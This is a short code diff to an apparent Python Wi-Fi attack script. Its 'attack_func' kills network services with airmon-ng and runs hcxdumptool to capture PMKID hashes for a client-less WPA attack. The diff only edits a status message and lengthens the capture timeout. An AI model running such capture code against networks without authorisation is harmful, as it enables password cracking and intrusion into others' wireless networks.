@@ -156,12 +156,12 @@ def attack_func(network_interface, attack_mode):
         subprocess.run(["clear"])
         time.sleep(1)
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
-        get_colours("Starting the PKMID Client-Less ATTACK", "magenta")
+        get_colours("[*] Starting the PKMID Client-Less ATTACK", "magenta")
         time.sleep(3)
         get_colours("", "yellow")
         process = subprocess.Popen(["sudo", "hcxdumptool", "-i" + network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
         try:
-            process.wait(timeout=5)  # Time for the process
+            process.wait(timeout=70)  # Time for the process
         except subprocess.TimeoutExpired:
             print('\n[!] Timed out - killing process ID - ', process.pid)
             process.kill()
